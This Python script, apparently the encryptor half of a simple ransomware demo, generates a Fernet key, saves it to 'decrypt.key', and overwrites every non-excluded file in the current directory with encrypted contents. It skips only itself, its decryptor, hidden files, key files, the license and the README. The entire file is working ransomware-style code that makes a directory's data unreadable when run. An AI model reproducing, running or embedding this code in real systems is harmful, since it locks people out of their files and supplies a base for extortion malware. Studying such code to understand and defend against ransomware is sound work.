from cryptography.fernet import Fernet
import os

'''
Key Management
'''
key = Fernet.generate_key()
with open("decrypt.key", "wb") as key_file:
    key_file.write(key)

'''
File listing
'''
files = []
for file in os.listdir():
    if file == "encrypt.py" or file.startswith('.') or file == "decrypt.py" or file.endswith('.key') or file == "LICENSE" or file == "README.md":
        continue
    files.append(file)

for file in files:
    with open(file, "rb") as target_file:
        contents = target_file.read()
    encrypt_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as target_file:
        target_file.write(encrypt_contents)
